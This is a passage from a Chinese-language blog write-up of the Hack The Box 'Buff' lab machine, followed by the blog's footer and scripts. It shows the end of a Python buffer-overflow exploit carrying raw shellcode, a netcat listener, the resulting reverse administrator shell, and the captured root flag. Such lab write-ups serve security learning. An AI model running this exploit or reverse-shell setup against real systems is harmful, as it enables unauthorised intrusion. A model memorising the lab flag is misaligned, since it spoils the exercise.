class="string">&quot;\x07\x6d\xbe\xa0\xa0\xd8\x98\x8f\x31\x70\xd8\x8e&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xb1\x8b\x0c\x71\x8b\x43\x41\x70\xcc\xbe\xab\x20&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x85\xb5\x19\xd5\xa2\x80\xa1\x5e\xf8\x05\xa1\x83&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x49\x27\x80\x15\xc1\x7e\x02\x97\x06\x0b\x0b\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4b\x36\xc2\x24\xbf\xcc\xd5\xec\xf1\x2d\x79\xd1&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x3d\xdc\x80\x15\xf9\x3f\xf7\x6f\xf9\xc2\x0f\xb4&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x83\x18\x9a\x2f\x23\xea\x3c\x94\xd5\x3f\xda\x5f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xd9\xf4\xa9\x38\xfe\x0b\x7e\x33\xfa\x80\x81\x94&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x8a\xd3\xa5\x30\xd6\x80\xc4\x61\xb2\x67\xf9\x72&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x1d\xd7\x5f\xf8\xb0\x0c\xd2\xa3\xde\xd3\x61\xde&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xad\xd4\x79\xe1\x81\xbc\x48\x6a\x4e\xba\x55\xb9&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x2a\x34\x1c\xe0\x1b\xdd\xf8\x70\x1e\x80\xfb\xae&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x5d\xbd\x7f\x5b\x1e\x3a\x9f\x2e\x1b\x06\x18\xc2&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x51\x17\xcc\xe4\xc6\x18\xc5\xa6\xd2\xba\x9d\x49&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4e\x33\x2d\xd6\xf8\xc7\xa9\x89\x9b\x54\x6d\x31&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x25\xf6\xd1\xc8\xa5\x64\x86\x53\x22\x29\x36\xf7&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x84\xb4\xbe\x92\xf8\x1b\x5b\x7d\x9a\x0e\xc7\x53&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x39\xa9\x62\x8c\xf0\x79\x42\xfd\xc2\x57\xab\xca&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x0c\x9a\xfa\x02\x71\xed\xcc\x5d\x49\x11&quot;</span></span><br><span class="line">overrun    = b<span class="string">&quot;C&quot;</span> * (1500 - len(padding1 + NOPS + EIP + payload))</span><br><span class="line"></span><br><span class="line">buf = padding1 + EIP + NOPS + payload + overrun </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((target,8888))</span><br><span class="line">        s.send(buf)</span><br><span class="line">except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(sys.exc_value)</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>kali监听端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 7078</span></span><br><span class="line">listening on [any] 7078 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>执行buff.py利用</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python3 buff.py</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 7078</span></span><br><span class="line">listening on [any] 7078 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.198] 50209</span><br><span class="line">Microsoft Windows [Version 10.0.17134.1610]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">buff\administrator</span><br></pre></td></tr></table></figure><p><code>提权完成，寻找root.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">af0c7f7eef091d9e4b4cd0f0e88268c9</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure></div><div><div><div style="text-align:center;color:#000;font-size:20px">-------------纸短情长<i class="fa fa-paw"></i>下次再见-------------</div></div></div><div class="reward-container"><div>加个赞赏，万一有好心人呢~</div><button onclick='document.querySelector(".post-reward").classList.toggle("active")'>谢谢你请我吃辣条!</button><div class="post-reward"><div><img src="/images/wechatpay.jpg" alt="Lluna 微信"> <span>微信</span></div><div><img src="/images/alipay.jpg" alt="Lluna 支付宝"> <span>支付宝</span></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Lluna</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://lunamoore.github.io/2020/09/01/HTB-buff/" title="HTB-[buff]">https://lunamoore.github.io/2020/09/01/HTB-buff/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请标注链接及作者！</li></ul></div><div class="followme"><span>欢迎关注我的公众号</span><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/images/gzh.jpg"><span class="icon"><i class="fab fa-weixin"></i> </span><span class="label">WeChat</span></a></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶机</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/08/31/HTB-remote/" rel="prev" title="HTB-[remote]"><i class="fa fa-chevron-left"></i> HTB-[remote]</a></div><div class="post-nav-item"><a href="/2020/09/02/DC-9/" rel="next" title="DC-9">DC-9 <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2020 – <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Lluna</span></div><div class="wordcount"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-chart-line"></i> </span><span>站点总字数：</span> <span title="站点总字数">693k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span>站点阅读时长 &asymp;</span> <span title="站点阅读时长">10:30</span></span></div><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,8,14,15,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="小站已运行"+m+" 年 "+T+" 天 "+f+" 小时 "+h+" 分钟 "+u+" 秒"}siteTime()</script><div class="busuanzi-count"><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div><script color="0,0,0" opacity="0.7" zindex="-1" count="300" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: location.pathname,
    }, {"enable":true,"appId":"8hPlmJu758GqGb8p9gI7IWIH-gzGzoHsz","appKey":"EBvPjdspqOEm800591erwHwx","placeholder":"ヾﾉ≧∀≦)o来了老弟!","avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});</script><script type="text/javascript" src="/js/love.js"></script></body></html>